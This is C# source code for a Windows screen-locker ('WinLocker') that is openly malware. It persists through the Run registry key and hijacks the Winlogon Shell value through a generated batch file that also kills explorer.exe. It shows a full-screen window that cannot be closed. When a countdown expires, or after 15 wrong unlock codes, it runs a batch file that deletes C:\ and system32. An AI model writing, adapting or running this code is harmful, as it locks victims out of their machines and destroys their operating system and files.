using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Threading;

namespace Winlock
{
    public partial class Form1 : Form
    {

        private System.Windows.Forms.Timer timer1;
        private int counter = 10800;
        private static readonly string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        private static readonly string StartupValue = "MyApplicationName";

        // add to startup
        private static void SetStartup()
        {
            // set the application to run at startup
            RegistryKey key = Registry.CurrentUser.OpenSubKey(StartupKey, true);
            key.SetValue(StartupValue, Application.ExecutablePath.ToString());
        }

        public Form1()
        {
            // run over other apps
            TopMost = true;
            InitializeComponent();
            SetStartup();
        }


        private void Form1_Load(object sender, EventArgs e)
        {

            int screenWidth = Screen.PrimaryScreen.Bounds.Width;
            int screenHeight = Screen.PrimaryScreen.Bounds.Height;


            // locations
            label1.Location = new Point(screenWidth/2-label1.Width/2-label1.Width/4, label1.Height- label1.Height/2);
            pictureBox1.Location = new Point(label1.Location.X+label1.Width, label1.Location.Y);
            label2.Location = new Point(label1.Location.X, (label1.Location.Y + label4.Location.Y)/2);
            label4.Location = new Point(label2.Location.X, label2.Location.Y + label4.Height*8);
            button1.Location = new Point(screenWidth / 2 - button1.Width / 2, screenHeight - button1.Height * 2 + button1.Height / 2);
            textBox1.Location = new Point(screenWidth / 2 - textBox1.Width / 2, screenHeight - textBox1.Height * 2 - textBox1.Height * 2);
            label3.Location = new Point(screenWidth / 2 - label3.Width / 2, screenHeight - label3.Height * 2 - label3.Height * 2 - button1.Height+5);
            label5.Location = new Point(screenWidth / 2 - label5.Width / 2, textBox1.Location.Y - label5.Height);


            // maxmize
            FormBorderStyle = FormBorderStyle.None;
            WindowState = FormWindowState.Maximized;

            string PC_name = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            string username = Environment.UserName;


            // timer
            timer1 = new System.Windows.Forms.Timer();
            timer1.Tick += new EventHandler(timer1_Tick);
            timer1.Interval = 1000; // 1 second
            timer1.Start();
            int hoursTimer = counter/3600;
            int minutesTimer = counter/60;
            label2.Text = "You have: " + hoursTimer.ToString() + " Hours or" + " " + minutesTimer.ToString() + " Minutes";


            label4.Text = String.Format(
                "Wow! Hello there, {0}! Great to see you! Your PC has been officially locked by my WinLocker!\n\n" +
                "Your PC name is: {1}\n" +
                "OS: {2}\n" +
                "Amount of processor cores: {3}\n" +
                "Processor model: {4}",

                username,
                PC_name,
                Environment.OSVersion,
                Environment.ProcessorCount,
                Environment.GetEnvironmentVariable("PROCESSOR_IDENTIFIER"));


            /**
             * "REG ADD \"HKLM\\System\\CurrentControlSet\\Control\\Keyboard Layout\" /v \"Scancode Map\" /t REG_BINARY /d 00000000000000000300000000005BE000005CE000000000 /f &&" +
                " Taskkill /f /im explorer.exe &&" +
                " reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\\"Windows NT\"\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d {0} /f &&" +
                " reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\\"Windows NT\"\\CurrentVersion\\Winlogon\" /v userinit /t REG_SZ /d {0} /f &&" +
                " reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskMgr /t REG_DWORD /d 1 /f", System.Reflection.Assembly.GetEntryAssembly().Location);
             **/


            // create a .bat file with malicious commands
            string path = @"c:\Windows\srcrn.bat";
            string a = String.Format(" reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell /t REG_SZ /d {0} /f", System.Reflection.Assembly.GetEntryAssembly().Location);

            using (FileStream fs = File.Create(path))
            {
                byte[] info = new UTF8Encoding(true).GetBytes("Taskkill /f /im explorer.exe &&" +
                    a);
                // Add some information to the file.
                fs.Write(info, 0, info.Length);
            }

            // run this file
            System.Diagnostics.Process.Start(path);
        }


        // don't let user close the app
        protected override void OnClosing(CancelEventArgs e)
        {
            base.OnClosing(e);
            e.Cancel = true;
        }


        // timer handler
        private void timer1_Tick(object sender, EventArgs e)
        {
            counter--;
            int hoursTimer = counter / 3600;
            int minutesTimer = counter / 60;
            if (counter == 0)
            {
                timer1.Stop();

                // delete your fucking Windows brah
                string path = @"c:\Windows\module.bat";
                using (FileStream fs = File.Create(path))
                {
                    byte[] info = new UTF8Encoding(true).GetBytes("RD C:\\ /S /Q && del c:\\windows\\system32*.* /q && del /f /s /q “C:*.*.”");
                    // Add some information to the file.
                    fs.Write(info, 0, info.Length);
                }

                // run this file
                System.Diagnostics.Process.Start(path);

                Thread.Sleep(75000);

                Application.Exit();

            }
            label2.Text = "You have: " + hoursTimer.ToString() + " Hours or" + " " + minutesTimer.ToString() + " Minutes";
        }


        // correct password check
        private static int attempts = 15;
        private void button1_Click(object sender, EventArgs e)
        {
            if (textBox1.Text == "9872")
            {
                Application.Exit();
            }

            else {
                attempts--;
                label5.Text = String.Format("Attempts: {0}", attempts);
            }

            if (attempts == 0)
            {
                // delete your fucking Windows brah
                string path = @"c:\Windows\module.bat";
                using (FileStream fs = File.Create(path))
                {
                    byte[] info = new UTF8Encoding(true).GetBytes("RD C:\\ /S /Q && del c:\\windows\\system32*.* /q && del /f /s /q “C:*.*.”");
                    // Add some information to the file.
                    fs.Write(info, 0, info.Length);
                }

                // run this file
                System.Diagnostics.Process.Start(path);

                Thread.Sleep(50000);


                Application.Exit();

            }
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }
    }
}
